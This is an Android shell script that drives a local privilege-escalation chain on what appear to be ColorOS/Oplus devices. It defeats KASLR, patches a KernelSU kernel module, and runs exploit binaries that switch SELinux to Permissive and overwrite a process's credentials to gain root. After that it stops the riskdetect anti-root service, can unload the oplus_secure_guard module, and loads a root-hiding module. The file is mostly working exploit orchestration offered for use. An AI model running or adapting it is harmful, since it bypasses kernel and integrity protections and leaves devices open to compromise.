#!/system/bin/sh
# pyb110 one-key flow: slide -> patch ko -> permissive -> cred write -> load official KernelSU
D=${PYB110_DIR:-/data/local/tmp/pyb110}
cd "$D" || exit 1
chmod 755 prep_solve prep_patch t64560_v36 t64560_loader2 t64560_w2 forker ksu* ksud* 2>/dev/null

MANAGER=${PYB110_MANAGER:-kernelsu}
DISABLE_ANTIROOT=${PYB110_DISABLE_ANTIROOT:-1}
case "$MANAGER" in
  finasu) BASE=ksu-base-finasu.ko; KSUD=ksud_finasu; MPKG=me.yuki.fina ;;
  next) BASE=ksu-base-next.ko; KSUD=ksud_next; MPKG=com.rifsxd.ksunext ;;
  bakasu) BASE=ksu-base-bakasu.ko; KSUD=ksud_bakasu; MPKG=com.resukisu.resukisu ;;
  sukisu) BASE=ksu-base-sukisu.ko; KSUD=ksud_sukisu; MPKG=com.sukisu.ultra ;;
  *) MANAGER=kernelsu; BASE=ksu-base.ko; KSUD=ksud_official; MPKG=me.weishu.kernelsu ;;
esac
MPKG=${PYB110_MANAGER_PKG:-$MPKG}
echo "MANAGER=$MANAGER VERSION=${PYB110_MANAGER_VERSION:-unknown}"



stop_riskdetect() {
  if [ "$DISABLE_ANTIROOT" = "1" ]; then
    su -c "stop riskdetect" 2>&1
    echo "ANTIROOT_STOP_RC=$?"
    echo "ANTIROOT_STATE=$(su -c 'getprop init.svc.riskdetect' 2>/dev/null | tr -d '\r')"
  else
    echo "ANTIROOT_SKIP: switch off; riskdetect not stopped"
  fi
}

restore_screenshot_stack() {
  echo "SCREENSHOT_STACK: checking ColorOS screenshot components"
  if ! su -c true >/dev/null 2>&1; then
    echo "SCREENSHOT_STACK_SKIP=no-su"
    return 0
  fi
  DIS=$(su -c "pm list packages -d --user 0 2>/dev/null" 2>/dev/null | tr -d '\r')
  for p in com.oplus.exsystemservice com.oplus.screenshot; do
    if ! su -c "pm list packages '$p'" 2>/dev/null | grep -qx "package:$p"; then
      echo "SCREENSHOT_STACK_ABSENT=$p"
      continue
    fi
    if printf '%s\n' "$DIS" | grep -qx "package:$p"; then
      su -c "pm enable --user 0 '$p'" 2>&1
      echo "SCREENSHOT_STACK_ENABLED=$p rc=$?"
    else
      echo "SCREENSHOT_STACK_OK=$p"
    fi
  done
}

crown_dynamic_manager() {
  if [ "$MANAGER" != "finasu" ]; then
    return 0
  fi
  APKP=$(pm path me.yuki.fina 2>/dev/null | sed -n 's/^package://p' | head -n 1)
  if [ -z "$APKP" ]; then
    echo "DYNAMIC_MANAGER_NO_APK"
    return 0
  fi
  su -c "/data/adb/ksud dynamic set-apk '$APKP'" 2>&1
  echo "DYNAMIC_SET_APK_RC=$?"
  su -c "/data/adb/ksud dynamic list" 2>&1
  echo "DYNAMIC_LIST_RC=$?"
}

unload_guard() {
  if [ "${PYB110_UNLOAD_GUARD:-0}" = "1" ]; then
    echo "UNLOAD_GUARD: rmmod oplus_secure_guard_new"
    su -c "rmmod oplus_secure_guard_new" 2>&1
    echo "UNLOAD_GUARD_RC=$?"
    if grep -qi oplus_secure_guard /proc/modules 2>/dev/null; then
      echo "UNLOAD_GUARD_STILL_LOADED"
    else
      echo "UNLOAD_GUARD_GONE"
    fi
  else
    echo "UNLOAD_GUARD_SKIP"
  fi
}

install_manager_apk() {
  APK=${PYB110_MANAGER_APK:-}
  if [ -n "$APK" ] && [ -f "$D/$APK" ]; then
    su -c "pm install -r '$D/$APK'" 2>&1
    echo "APK_INSTALL_RC=$?"
  fi
}

load_susfs() {
  if [ "${PYB110_SUSFS:-0}" != "1" ]; then
    echo "SUSFS_SKIP"
    return 0
  fi
  if [ ! -f "$D/susfs_guard_lkm.ko" ]; then
    echo "SUSFS_MISSING"
    return 0
  fi
  if su -c "test -d /sys/module/susfs_guard_lkm" 2>/dev/null; then
    echo "SUSFS_ALREADY"
    return 0
  fi
  loaded=0
  for c in "$D/$KSUD" /data/adb/ksud /data/adb/ksu/bin/ksud; do
    if ! su -c "test -x '$c'" 2>/dev/null; then continue; fi
    echo "SUSFS_INSMOD_TRY=$c"
    su -c "$c insmod '$D/susfs_guard_lkm.ko' expose_proc=1" 2>&1
    sleep 1
    if su -c "test -d /sys/module/susfs_guard_lkm" 2>/dev/null; then loaded=1; break; fi
  done
  if [ "$loaded" != "1" ]; then
    echo "SUSFS_INSMOD_FALLBACK=insmod"
    su -c "insmod '$D/susfs_guard_lkm.ko' expose_proc=1" 2>&1
    sleep 1
    if su -c "test -d /sys/module/susfs_guard_lkm" 2>/dev/null; then loaded=1; fi
  fi
  if [ "$loaded" = "1" ]; then
    echo "SUSFS_LOADED"
  else
    echo "SUSFS_LOAD_FAIL"
  fi
}

if grep -qi kernelsu /proc/modules 2>/dev/null; then
  echo "ALREADY_LOADED: kernelsu present, skip exploit/load"
  cp -f "$KSUD" /data/local/tmp/ksud_official 2>/dev/null
  stop_riskdetect
  unload_guard
  su -c "/data/local/tmp/ksud_official install" 2>&1
  echo "KSUD_INSTALL_RC=$?"
  install_manager_apk
  crown_dynamic_manager
  restore_screenshot_stack
  su -c "chmod 644 /data/system/packages.list 2>/dev/null; mv /data/system/packages.list /data/system/packages.list.k 2>/dev/null && mv /data/system/packages.list.k /data/system/packages.list 2>/dev/null; sleep 2" 2>&1
  load_susfs
  am force-stop "$MPKG" 2>/dev/null
  monkey -p "$MPKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
  su -c "id; getenforce; grep -i kernelsu /proc/modules; /data/adb/ksud debug version" 2>&1
  echo DONE
  exit 0
fi

echo "[1/6] capture slide"
sh take_slide.sh

echo "[2/6] solve slide"
./prep_solve . syms.txt || { echo "SOLVE_FAIL"; exit 11; }
TARGET=$(cat target.txt)
echo "TARGET=$TARGET"

echo "[3/6] patch ko ($BASE)"
./prep_patch "$BASE" syms.txt "$(cat slide.txt)" ksu-official.ko || { echo "PATCH_FAIL"; exit 12; }
cp -f ksu-official.ko /data/local/tmp/ksu-official.ko || { echo "KO_COPY_FAIL"; exit 16; }
cp -f "$KSUD" /data/local/tmp/ksud_official 2>/dev/null

echo "[4/6] SELinux -> Permissive"
rm -f v36.log
setsid sh -c "exec ./t64560_v36 0 '$TARGET' 180 400 16 6000 12000 4500 2>&1 | tee v36.log" &
VP=$!
i=0
while [ $i -lt 480 ]; do
  [ "$(getenforce 2>/dev/null)" = "Permissive" ] && break
  kill -0 $VP 2>/dev/null || break
  sleep 5
  i=$((i+1))
done
if [ "$(getenforce 2>/dev/null)" != "Permissive" ]; then echo "SELINUX_FAIL"; exit 13; fi
kill -TERM -$VP 2>/dev/null
echo "SELINUX_OK"

echo "[5/6] cred write + load"
rm -f loader.log w2.log
setsid sh -c "exec ./t64560_loader2 --target 2>&1 | tee loader.log" &
LP=$!
CRED=""
i=0
while [ $i -lt 120 ]; do
  CRED=$(grep -o 'TARGET_CRED 0x[0-9a-f]*' loader.log 2>/dev/null | awk '{print $2}')
  [ -n "$CRED" ] && break
  kill -0 $LP 2>/dev/null || break
  sleep 1
  i=$((i+1))
done
if [ -z "$CRED" ]; then echo "NO_CRED"; exit 14; fi
echo "CRED=$CRED"
echo "W2_START cred=$CRED timers=6400 frag=6000"
setsid sh -c "exec ./t64560_w2 '$CRED' 180 180 400 16 6000 12000 2>&1 | tee w2.log" &
i=0
while [ $i -lt 720 ]; do
  grep -q LOADED_SLEEP loader.log 2>/dev/null && break
  grep -qi kernelsu /proc/modules 2>/dev/null && break
  kill -0 $LP 2>/dev/null || break
  sleep 5
  i=$((i+1))
done
if ! grep -qi kernelsu /proc/modules 2>/dev/null; then echo "LOAD_FAIL"; exit 15; fi
echo "MODULE_LOADED"

echo "[6/6] anti-root guard + install ksud ($MANAGER)"
stop_riskdetect
unload_guard
su -c "/data/local/tmp/ksud_official install" 2>&1
echo "KSUD_INSTALL_RC=$?"
install_manager_apk
crown_dynamic_manager
restore_screenshot_stack
sleep 10
su -c "id; getenforce; grep -i kernelsu /proc/modules; /data/adb/ksud debug version; getprop init.svc.riskdetect" 2>&1
echo "SU_ID_RC=$?"
sleep 3
echo "CROWN"
su -c "chmod 644 /data/system/packages.list 2>/dev/null; mv /data/system/packages.list /data/system/packages.list.k 2>/dev/null && mv /data/system/packages.list.k /data/system/packages.list 2>/dev/null; sleep 2" 2>&1
echo "CROWN_RC=$?"
sleep 3
load_susfs
am force-stop "$MPKG" 2>/dev/null
monkey -p "$MPKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
echo DONE
